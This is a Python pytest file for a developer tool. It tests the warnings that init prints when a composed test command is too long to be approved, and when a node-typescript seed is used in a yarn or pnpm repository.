def test_init_warns_when_the_composed_command_would_be_refused_at_approve(repo, capsys):
    long = long_draft(150)
    assert len(stack.compose_test_command(profile(sources={}, stacks=long["stacks"][:1])) or "") < 500
    with pytest.raises(ValueError):
        stack.compose_test_command(long)
    path = draft_file(repo, long)
    for flags in ((), ("--apply",)):  # preview and apply
        code, out, err = init(capsys, "--from", path, *flags)
        warnings = [ln for ln in err.splitlines() if ln.startswith("warning: ")]
        assert code == 0 and json.loads(out)["ok"] is True and warnings == ["warning: " + stack._W_LONG], (flags, err)
        draft_file(repo, long)  # --apply removes the draft file
    assert "500" in stack._W_LONG and "shorten the roots" in stack._W_LONG and "one repo script" in stack._W_LONG
    # the refusal at approve is actionable for a seed-built draft too, and a short draft gets no warning
    with pytest.raises(ValueError) as e:
        stack.plan_approve(repo)
    assert "shorten the stack roots" in str(e.value) and "`test.run`" in str(e.value) and "one repo script" in str(e.value)
    short = draft_file(repo, long_draft(5))
    assert init(capsys, "--from", short)[2] == ""


def test_init_warns_when_node_typescript_meets_a_yarn_or_pnpm_repository(repo, capsys):
    cases = {"yarn": {"package.json": "{}\n", "yarn.lock": "\n"}, "pnpm": {"package.json": "{}\n", "pnpm-lock.yaml": "\n"},
             "both": {"package.json": "{}\n", "yarn.lock": "\n", "package-lock.json": "{}\n"}}
    for name, files in cases.items():
        commit_all(repo, files)
        for flags in ((), ("--apply", "--force")):
            code, out, err = init(capsys, "--seed", "node-typescript", *flags)
            assert code == 0 and err == "warning: " + stack._W_NPM + "\n", (name, flags, err)
        assert init(capsys, "--seed", "python-pytest")[2] == ""  # another seed: no warning
        draft_file(repo, profile(sources={}, stacks=[{"id": "typescript", "root": ".", "commands": {"test": {"run": "yarn test", "source": "unverified"}}}]))
        assert init(capsys, "--from", ".ghp/stack-draft.json")[2] == ""  # --from is the human's or agent's own text
        git(repo, "rm", "-q", "-r", "-f", ".", "--ignore-unmatch")
        git(repo, "commit", "-q", "-m", f"clean {name}", "--allow-empty")
    commit_all(repo, {"package.json": "{}\n", "package-lock.json": "{}\n"})  # npm: the seed fits
    assert init(capsys, "--seed", "node-typescript")[2] == ""
    assert "npm only" in stack._W_NPM
